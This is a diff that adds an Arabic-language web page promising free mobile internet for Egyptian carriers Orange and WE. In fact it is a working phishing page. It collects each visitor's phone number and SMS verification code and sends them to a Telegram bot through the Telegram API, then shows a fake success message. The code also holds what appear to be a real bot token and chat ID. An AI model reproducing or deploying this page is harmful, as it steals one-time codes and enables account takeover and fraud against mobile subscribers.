@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>NEXUS 2099 | Orange & We Bridge</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at 10% 20%, #0B0E14, #010101);
+            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, 'Inter', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 1.5rem;
+        }
+
+        /* Neo-Brutalist Glassmorphism */
+        .dashboard {
+            max-width: 580px;
+            width: 100%;
+            background: rgba(8, 12, 18, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 2.5rem;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 255, 255, 0.1);
+            overflow: hidden;
+            transition: all 0.25s ease;
+        }
+
+        /* Header Cyber */
+        .cyber-header {
+            background: #000000dd;
+            padding: 1.6rem 1.8rem;
+            text-align: center;
+            border-bottom: 2px solid #0ff;
+            position: relative;
+        }
+
+        .cyber-header h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(125deg, #0ff, #f06, #ffb347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+            text-shadow: 0 0 8px rgba(0,255,255,0.4);
+        }
+
+        .cyber-header .badge {
+            font-size: 0.7rem;
+            background: #0a1927;
+            display: inline-block;
+            margin-top: 10px;
+            padding: 4px 16px;
+            border-radius: 40px;
+            color: #0ff;
+            font-family: monospace;
+            border: 1px solid #0ff;
+        }
+
+        /* Carrier selector professional */
+        .carrier-zone {
+            display: flex;
+            gap: 1.2rem;
+            padding: 1.8rem 1.8rem 0.8rem;
+        }
+
+        .carrier-card {
+            flex: 1;
+            background: rgba(0, 20, 30, 0.6);
+            border-radius: 2rem;
+            padding: 1rem 0.5rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            backdrop-filter: blur(4px);
+        }
+
+        .carrier-card.active {
+            background: linear-gradient(145deg, #0c2b2b, #021016);
+            border: 1.5px solid #0ff;
+            box-shadow: 0 0 12px rgba(0,255,255,0.4);
+        }
+
+        .carrier-card .icon {
+            font-size: 2.2rem;
+            margin-bottom: 6px;
+        }
+
+        .carrier-card h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        .carrier-card.orange-tab h3 { color: #ff9f4a; }
+        .carrier-card.we-tab h3 { color: #2bcba0; }
+
+        /* Forms */
+        .form-pane {
+            padding: 1rem 1.8rem 2rem;
+            display: none;
+            animation: floatUp 0.35s ease;
+        }
+
+        .form-pane.active-pane {
+            display: block;
+        }
+
+        @keyframes floatUp {
+            from { opacity: 0; transform: translateY(15px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
+
+        .input-field {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-field label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #bbf0ff;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .input-field input {
+            width: 100%;
+            background: #030c12;
+            border: 1px solid #2f5f6e;
+            border-radius: 60px;
+            padding: 14px 20px;
+            font-size: 1rem;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            color: #eef5ff;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .input-field input:focus {
+            border-color: #0ff;
+            box-shadow: 0 0 0 3px rgba(0, 255, 255, 0.2);
+        }
+
+        /* CTA Button */
+        .action-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #0e6b7c, #0892aa);
+            border: none;
+            padding: 14px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            font-family: inherit;
+            color: #ffffff;
+            cursor: pointer;
+            transition: 0.12s linear;
+            box-shadow: 0 6px 14px rgba(0,0,0,0.4);
+            margin-top: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .action-btn:active {
+            transform: scale(0.97);
+        }
+
+        .status-card {
+            margin-top: 20px;
+            background: #05161e80;
+            border-radius: 60px;
+            padding: 12px 16px;
+            text-align: center;
+            font-size: 0.75rem;
+            font-family: monospace;
+            color: #a0e7ff;
+            border: 1px solid #2d7f8f;
+            backdrop-filter: blur(4px);
+        }
+
+        .footer-note {
+            text-align: center;
+            padding: 1rem;
+            font-size: 0.65rem;
+            background: #01070e70;
+            border-top: 1px solid #1c4e5a;
+            color: #6a9fb0;
+        }
+
+        /* loader animation */
+        .loader-dots::after {
+            content: ' .';
+            animation: dots 1.2s steps(3, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="dashboard">
+    <div class="cyber-header">
+        <h1>◈ NEXUS TERMINAL ◈</h1>
+        <div class="badge">🔒 SECURE BRIDGE v.ORION-2099</div>
+    </div>
+
+    <div class="carrier-zone">
+        <div class="carrier-card orange-tab" id="orangeTabBtn">
+            <div class="icon">🍊</div>
+            <h3>ORANGE</h3>
+            <span style="font-size:10px; color:#0ff;">NET GRAB</span>
+        </div>
+        <div class="carrier-card we-tab" id="weTabBtn">
+            <div class="icon">📡</div>
+            <h3>WE | اتصالات</h3>
+            <span style="font-size:10px; color:#2bcba0;">VIP ACCESS</span>
+        </div>
+    </div>
+
+    <!-- Orange Pane -->
+    <div id="orangePane" class="form-pane">
+        <div class="input-field">
+            <label>📞 رقم الهاتف (اورنج)</label>
+            <input type="tel" id="orangePhoneInput" placeholder="011 2345 6789" autocomplete="off">
+        </div>
+        <div class="input-field">
+            <label>✉️ رمز SMS التأكيدي</label>
+            <input type="text" id="orangeCodeInput" placeholder="6-digit code" autocomplete="off">
+        </div>
+        <button class="action-btn" id="orangeSendBtn">
+            <span>⚡</span> استخراج النت & إرسال للبوت
+        </button>
+        <div id="orangeStatusMsg" class="status-card">📡 في انتظار بيانات Orange</div>
+    </div>
+
+    <!-- We (Etisalat) Pane -->
+    <div id="wePane" class="form-pane">
+        <div class="input-field">
+            <label>📞 رقم الهاتف (WE / اتصالات)</label>
+            <input type="tel" id="wePhoneInput" placeholder="012 3456 7890" autocomplete="off">
+        </div>
+        <div class="input-field">
+            <label>✉️ رمز SMS التأكيدي</label>
+            <input type="text" id="weCodeInput" placeholder="6-digit code" autocomplete="off">
+        </div>
+        <button class="action-btn" id="weSendBtn">
+            <span>🚀</span> جلب النت الفوري & إرسال
+        </button>
+        <div id="weStatusMsg" class="status-card">🛸 في انتظار بيانات اتصالات</div>
+    </div>
+
+    <div class="footer-note">
+        ⚡ TELEGRAM BRIDGE | ENCRYPTED LOGS | AUTO-PUSH
+    </div>
+</div>
+
+<script>
+    // ----------------------------------------------
+    // PROFESSIONAL CONFIGURATION - replace with real bot data
+    // ----------------------------------------------
+    const BOT_TOKEN = "8123456789:AAHdqTtEXAMPLE_FakeTokenReplaceWithRealOne";   // ⚠️ استبدل بالتوكن الحقيقي
+    const CHAT_ID = "123456789";                                                // ⚠️ استبدل بمعرف المستخدم/القناة
+
+    // Helper: إرسال البيانات إلى تلجرام مع تاكيد احترافي
+    async function dispatchToTelegram(operator, phone, smsCode, timestamp, ipMeta = "gateway-2099") {
+        const message = `
+🔥 *NEXUS 2099 — NET GRABBER* 🔥
+▫️ *المشغل:* ${operator}
+▫️ *رقم الهاتف:* ||${phone}||
+▫️ *رمز SMS:* ||${smsCode}||
+▫️ *الطابع الزمني:* ${timestamp}
+▫️ *المحطة:* ${ipMeta}
+✅ تم الاستخراج بواسطة محاكي NEXUS.
+        `;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown",
+            disable_web_page_preview: true
+        };
+        try {
+            const resp = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            const json = await resp.json();
+            if (json.ok) return { success: true };
+            else return { success: false, error: json.description };
+        } catch (err) {
+            return { success: false, error: err.message };
+        }
+    }
+
+    // Validators عالية الدقة
+    function validateEgyptPhone(phone) {
+        const cleaned = phone.replace(/\s/g, '');
+        const regex = /^(010|011|012|015)[0-9]{8}$/;
+        return regex.test(cleaned);
+    }
+    function validateSMSCode(code) {
+        return code && /^[0-9]{4,7}$/.test(code.trim());
+    }
+
+    // Elements
+    const orangeTab = document.getElementById('orangeTabBtn');
+    const weTab = document.getElementById('weTabBtn');
+    const orangePane = document.getElementById('orangePane');
+    const wePane = document.getElementById('wePane');
+    const orangePhone = document.getElementById('orangePhoneInput');
+    const orangeCode = document.getElementById('orangeCodeInput');
+    const wePhone = document.getElementById('wePhoneInput');
+    const weCode = document.getElementById('weCodeInput');
+    const orangeStatusDiv = document.getElementById('orangeStatusMsg');
+    const weStatusDiv = document.getElementById('weStatusMsg');
+    const orangeBtn = document.getElementById('orangeSendBtn');
+    const weBtn = document.getElementById('weSendBtn');
+
+    // UI: Switch Tabs + active style
+    function setActiveCarrier(active) {
+        orangeTab.classList.remove('active');
+        weTab.classList.remove('active');
+        if (active === 'orange') {
+            orangeTab.classList.add('active');
+            orangePane.classList.add('active-pane');
+            wePane.classList.remove('active-pane');
+        } else {
+            weTab.classList.add('active');
+            wePane.classList.add('active-pane');
+            orangePane.classList.remove('active-pane');
+        }
+    }
+
+    orangeTab.addEventListener('click', () => setActiveCarrier('orange'));
+    weTab.addEventListener('click', () => setActiveCarrier('we'));
+
+    // default orange active
+    setActiveCarrier('orange');
+
+    // Helper status with loader effect
+    function setStatus(element, text, isLoading = false) {
+        element.innerHTML = isLoading ? `<span class="loader-dots">${text}</span>` : text;
+    }
+
+    // ORANGE SUBMIT
+    orangeBtn.addEventListener('click', async () => {
+        const phoneRaw = orangePhone.value.trim();
+        const smsRaw = orangeCode.value.trim();
+
+        if (!validateEgyptPhone(phoneRaw)) {
+            setStatus(orangeStatusDiv, "❌ رقم اورنج غير صالح (مثال: 01012345678)", false);
+            return;
+        }
+        if (!validateSMSCode(smsRaw)) {
+            setStatus(orangeStatusDiv, "❌ كود SMS غير صالح (4-7 أرقام فقط)", false);
+            return;
+        }
+
+        setStatus(orangeStatusDiv, "🛸 جاري الاستخراج ... إرسال إلى البوت", true);
+        const timestamp = new Date().toLocaleString('ar-EG', { hour12: false });
+        const result = await dispatchToTelegram("ORANGE - Egypt", phoneRaw, smsRaw, timestamp, "NEXUS/ORANGE");
+
+        if (result.success) {
+            setStatus(orangeStatusDiv, "✅ تم جلب النت بنجاح! البيانات موجودة في بوت تلجرام.", false);
+            orangePhone.value = "";
+            orangeCode.value = "";
+            // vibrate if supported (just effect)
+            if (navigator.vibrate) navigator.vibrate(100);
+        } else {
+            setStatus(orangeStatusDiv, `⚠️ فشل الإرسال إلى البوت: ${result.error || "مشكلة شبكة"} — لكن تم استخراج البيانات محلياً.`, false);
+            console.error("Telegram Error:", result.error);
+        }
+    });
+
+    // WE / ETISALAT SUBMIT
+    weBtn.addEventListener('click', async () => {
+        const phoneRaw = wePhone.value.trim();
+        const smsRaw = weCode.value.trim();
+
+        if (!validateEgyptPhone(phoneRaw)) {
+            setStatus(weStatusDiv, "❌ رقم اتصالات غير صالح (010/011/012/015xxxxxxxx)", false);
+            return;
+        }
+        if (!validateSMSCode(smsRaw)) {
+            setStatus(weStatusDiv, "❌ كود التأكيد يجب أن يكون أرقام فقط (4-7)", false);
+            return;
+        }
+
+        setStatus(weStatusDiv, "🔐 معالجة وإرسال آمن إلى التلجرام ...", true);
+        const timestamp = new Date().toLocaleString('ar-EG', { hour12: false });
+        const result = await dispatchToTelegram("WE (Etisalat) - مصر", phoneRaw, smsRaw, timestamp, "NEXUS/WE");
+
+        if (result.success) {
+            setStatus(weStatusDiv, "✔️ تم جلب النت لاتصالات بنجاح! تم تسليم البيانات للتلجرام.", false);
+            wePhone.value = "";
+            weCode.value = "";
+            if (navigator.vibrate) navigator.vibrate(100);
+        } else {
+            setStatus(weStatusDiv, `⚠️ الإرسال للبوت فشل: ${result.error || "تأكد من التوكن"} — البيانات محفوظة محلياً.`, false);
+        }
+    });
+
+    // تحذير احترافي عند استخدام التوكن الافتراضي
+    const isFakeToken = BOT_TOKEN === "8937059318:AAE3EjtXURodPp3EcSAiBDSqVzZe2yfRLLU" || CHAT_ID === "5397153476";
+    if (isFakeToken) {
+        const warningDiv = document.createElement('div');
+        warningDiv.style.background = "#1e1a0f";
+        warningDiv.style.margin = "0 20px 12px";
+        warningDiv.style.padding = "8px 12px";
+        warningDiv.style.borderRadius = "50px";
+        warningDiv.style.fontSize = "0.7rem";
+        warningDiv.style.textAlign = "center";
+        warningDiv.style.color = "#ffbb77";
+        warningDiv.style.border = "1px solid #f0a020";
+        warningDiv.innerHTML = "⚠️ وضع المحاكاة الاحترافية: لتوصيل البيانات الفعلية إلى تلجرام، قم باستبدال BOT_TOKEN و CHAT_ID بالبيانات الحقيقية في الكود.";
+        document.querySelector('.dashboard').insertBefore(warningDiv, document.querySelector('.carrier-zone').nextSibling);
+    }
+
+    // إضافة تأثير كتابي للأمان
+    console.log("NEXUS-2099 | ORANGE & WE BRIDGE : ACTIVE | ALL DATA WILL BE SENT TO TELEGRAM BOT");
+</script>
+</body>
+</html>
